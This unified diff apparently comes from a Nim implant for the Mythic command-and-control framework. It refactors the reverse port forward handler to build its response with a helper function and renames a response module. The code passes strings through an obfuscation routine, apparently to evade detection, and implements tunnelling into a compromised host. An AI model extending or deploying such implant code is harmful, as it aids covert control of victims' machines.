@@ -1,6 +1,6 @@
 import std/[json, net, nativesockets, strutils, base64, strformat, tables, random, os]
 import ../config
-import ../utils/mythic_responses
+import ../utils/m_responses
 import ../utils/strenc
 
 const
@@ -309,13 +309,9 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   rpfwdActive = true
   
   # Return "processing" status - task continues in background
-  return %*{
-    obf("task_id"): taskId,
-    obf("user_output"): obf("Reverse port forward started on port ") & $port &
-      obf(", forwarding to ") & remoteIp & ":" & $remotePort,
-    obf("completed"): false,
-    obf("status"): obf("processing")
-  }
+  let msg = obf("Reverse port forward started on port ") & $port &
+    obf(", forwarding to ") & remoteIp & ":" & $remotePort
+  return mythicProcessing(taskId, msg)
 
 proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
   ## Process RPfwd messages from Mythic (data to send to connections)
